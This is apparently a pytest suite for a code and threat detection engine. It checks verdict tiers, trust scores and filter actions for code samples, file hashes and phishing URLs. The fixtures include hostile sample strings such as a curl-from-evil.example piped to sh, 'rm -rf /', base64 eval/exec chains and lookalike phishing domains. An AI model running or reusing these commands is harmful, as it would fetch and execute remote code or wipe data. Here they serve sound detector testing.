"""Phase 4 detection-engine tests: verdict tiers, single-indicator rule, consistency."""

from __future__ import annotations

from fastapi.testclient import TestClient

from backend_core import (
    ASSESSMENT_CONFIRMED,
    ASSESSMENT_HEURISTIC,
    ASSESSMENT_NONE,
    ASSESSMENT_SUSPICIOUS,
    MALICIOUS,
    REVIEW_REQUIRED,
    SECURE,
    analyze_code,
    assess_verification,
)
from threat_filter_core import ThreatFilterEngine, ThreatFilterInput

CLEAN_PYTHON = "def add(a, b):\n    return a + b\n"
EVAL_ONLY = "eval(cmd)\n"
SHELL_ONLY = "os.system(cmd)\n"
SYNTAX_BROKEN = "def broken(:\n    pass\n"
CHAIN_ATTACK = (
    "import os, subprocess\n"
    "payload = base64.b64decode('cGF5bG9hZA==')\n"
    "eval(compile(payload, '<s>', 'exec'))\n"
    "subprocess.run(payload, shell=True)\n"
    "os.system('curl http://evil.example | sh')\n"
)


def test_clean_code_is_secure_and_untagged() -> None:
    result = analyze_code(CLEAN_PYTHON, "python")
    assert result.verification_status == SECURE
    assert result.assessment == ASSESSMENT_NONE


def test_single_eval_is_review_not_malicious() -> None:
    """One weak indicator must never produce MALICIOUS — and must not pass as clean."""

    result = analyze_code(EVAL_ONLY, "python")
    assert result.verification_status == REVIEW_REQUIRED
    assert result.verification_status != MALICIOUS
    assert result.assessment == ASSESSMENT_SUSPICIOUS
    assert result.trust_score <= 75.0


def test_single_os_system_is_review_not_malicious() -> None:
    result = analyze_code(SHELL_ONLY, "python")
    assert result.verification_status == REVIEW_REQUIRED
    assert result.assessment == ASSESSMENT_SUSPICIOUS
    assert result.trust_score <= 75.0


def test_syntax_error_alone_is_review_not_malicious() -> None:
    result = analyze_code(SYNTAX_BROKEN, "python")
    assert result.verification_status == REVIEW_REQUIRED
    assert result.assessment == ASSESSMENT_SUSPICIOUS
    assert result.trust_score <= 75.0


def test_chained_indicators_confirm_detection() -> None:
    result = analyze_code(CHAIN_ATTACK, "python")
    assert result.verification_status == MALICIOUS
    assert result.assessment == ASSESSMENT_CONFIRMED
    assert result.trust_score <= 40.0


def test_malicious_and_review_scores_match_status() -> None:
    """Displayed trust scores must be consistent with the verdict tier."""

    for sample in (EVAL_ONLY, SHELL_ONLY, SYNTAX_BROKEN):
        result = analyze_code(sample, "python")
        if result.verification_status == MALICIOUS:
            assert result.trust_score <= 40.0
        elif result.verification_status == REVIEW_REQUIRED:
            assert result.trust_score <= 74.99


def test_heuristic_warning_for_secured_code_with_flags() -> None:
    assert assess_verification(SECURE, ["high_cyclomatic_complexity"]) == ASSESSMENT_HEURISTIC
    assert assess_verification(SECURE, []) == ASSESSMENT_NONE
    assert assess_verification(MALICIOUS, ["a", "b"]) == ASSESSMENT_CONFIRMED


def test_explanations_present_in_analysis_logs() -> None:
    result = analyze_code(CHAIN_ATTACK, "python")
    assert any("Decision note:" in line for line in result.analysis_logs)


def test_filter_threat_taxonomy_clean_file() -> None:
    engine = ThreatFilterEngine()
    result = engine.filter_threat(
        ThreatFilterInput(payload_type="file", file_name="clean.txt", file_bytes=b"hello world")
    )
    assert result.assessment == ASSESSMENT_NONE
    assert result.action == "ALLOW"


def test_filter_threat_taxonomy_phishing_url_consistency() -> None:
    """Assessment must stay consistent with the action across phishing URLs."""

    engine = ThreatFilterEngine()
    for url in (
        "http://account-verification.com/login",
        "https://paypal.com.evil-domain.com/signin",
        "http://secure-login.example.com/verify",
    ):
        result = engine.filter_threat(ThreatFilterInput(url=url))
        if result.action == "BLOCK":
            assert result.assessment == ASSESSMENT_CONFIRMED
        elif result.action == "QUARANTINE":
            assert result.assessment == ASSESSMENT_SUSPICIOUS
        else:
            assert result.assessment in {ASSESSMENT_NONE, ASSESSMENT_HEURISTIC}


def test_filter_threat_blocked_hash_is_confirmed_detection() -> None:
    import hashlib

    payload = b"malware"
    engine = ThreatFilterEngine()
    result = engine.filter_threat(
        ThreatFilterInput(
            payload_type="file",
            file_name="malware.bin",
            file_bytes=payload,
            blocked_sha256=[hashlib.sha256(payload).hexdigest()],
        )
    )
    assert result.action == "BLOCK"
    assert result.assessment == ASSESSMENT_CONFIRMED


def test_filter_threat_taxonomy_malformed_url_is_analysis_error() -> None:
    engine = ThreatFilterEngine()
    result = engine.filter_threat(ThreatFilterInput(url="https://example.com:99999/login"))
    assert result.action == "BLOCK"
    assert result.assessment == "Analysis Error"


def test_filter_threat_taxonomy_block_is_confirmed() -> None:
    engine = ThreatFilterEngine()
    result = engine.filter_threat(
        ThreatFilterInput(
            payload_type="file",
            file_name="rm.txt",
            file_bytes=b"#!/bin/sh\nrm -rf /\ncurl http://evil.example | sh\n",
            source_code="import subprocess\nos.system('curl http://x | sh')\neval(compile(a, 's', 'exec'))\n",
            language="python",
        )
    )
    if result.action == "BLOCK":
        assert result.assessment == ASSESSMENT_CONFIRMED
    elif result.action == "QUARANTINE":
        assert result.assessment == ASSESSMENT_SUSPICIOUS


def test_api_exposes_assessment_field(client: TestClient) -> None:
    response = client.post("/api/v1/inspect-code", json={"code": CLEAN_PYTHON, "language": "python"})
    assert response.status_code == 200
    body = response.json()
    assert body["assessment"] == ASSESSMENT_NONE
    assert body["verification_status"] == SECURE

    filter_response = client.post("/api/v1/filter-threat", json={"url": "https://example.com:99999/login"})
    assert filter_response.status_code == 200
    assert filter_response.json()["assessment"] == "Analysis Error"
